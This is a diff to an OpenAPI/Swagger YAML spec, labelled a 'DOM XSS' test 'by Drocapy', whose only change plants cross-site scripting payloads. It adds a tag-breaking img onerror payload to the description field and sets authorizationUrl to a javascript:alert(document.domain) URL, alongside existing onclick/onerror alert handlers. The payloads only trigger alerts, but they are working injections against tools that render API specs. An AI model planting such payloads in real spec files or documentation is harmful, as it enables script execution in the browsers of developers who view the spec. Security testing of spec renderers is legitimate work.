@@ -6,7 +6,8 @@ securityDefinitions:
 info:
   version: "1.0.0"
   title: DOM XSS imge Test by Drocapy
-  description: Hack By Drocapy <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">
+  description: Hack By Drocapy "><img src=x onerror=alert('XSS');> <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">
+  authorizationUrl: javascript:alert(document.domain)//
 paths:
   /Drocapy:
     get:
